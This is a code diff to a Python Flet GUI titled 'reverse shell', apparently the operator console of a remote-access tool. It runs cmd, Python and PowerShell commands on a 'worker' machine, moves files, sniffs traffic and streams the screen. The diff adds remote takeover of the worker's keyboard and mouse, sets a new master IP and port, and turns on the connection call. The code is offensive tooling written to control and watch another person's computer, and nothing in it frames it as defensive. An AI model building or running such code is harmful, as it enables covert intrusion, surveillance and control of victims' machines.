@@ -2,6 +2,7 @@ from typing import Callable
 
 from flet.core.datatable import DataColumn
 from flet.core.dropdown import DropdownOption
+from idna import decode
 
 from rs_master import Master, listen_to_keys
 import flet as ft
@@ -25,8 +26,8 @@ class App:
     def __init__(self):
         self.input_required_functions: dict[str,Callable[[],ft.AlertDialog]]= {"cmd" : self.cmd,"python":self.python,"powershell":self.powershell,"receive_file":self.receive_file,"send_file":self.send_file,"sniff_from_worker":self.sniff_from_worker}
         self.page: ft.Page | None = None
-        self.master = Master("192.168.68.108",5555)
-        #self.master.connect()
+        self.master = Master("10.0.0.12",5555)
+        self.master.connect()
         self.title = ft.Container(
             content=ft.Text("reverse shell", size=40, italic=True, weight=FontWeight.BOLD),
             alignment=ft.alignment.top_center,
@@ -66,9 +67,19 @@ class App:
         )
         self.exit = False
         self.livestream = ft.Checkbox(label="live stream", on_change=self.live_steam_pressed)
+        self.control_keys = ft.Checkbox(label="control the keys of the worker", on_change=self.control_keys_pressed)
+        self.control_mouse = ft.Checkbox(label="control the mouse of the worker", on_change=self.control_mouse_of_worker)
         self.master.on_stream_stop = self.live_stream_stopped
         self.dlg:ft.AlertDialog | None= None
         threading.Thread(target=self.master.show_stream, daemon=True).start()
+        threading.Thread(target=self.master.control_keys,daemon=True).start()
+        threading.Thread(target=self.master.control_mouse_on_worker, daemon=True).start()
+
+
+    def control_mouse_of_worker(self,e):
+        self.master.control_mouse = self.control_mouse.value
+    def control_keys_pressed(self,e):
+        self.master.control_key = self.control_keys.value
 
     def live_stream_stopped(self):
             self.livestream.value = False
@@ -212,8 +223,9 @@ class App:
 
                                                    ],
                                               rows=[
-                                                  ft.DataRow([ft.DataCell(self.livestream),
-                                                              ]),
+                                                  ft.DataRow([ft.DataCell(self.livestream)]),
+                                                  ft.DataRow([ft.DataCell(self.control_keys)]),
+                                                  ft.DataRow([ft.DataCell(self.control_mouse)])
                                               ]
 
                                           )
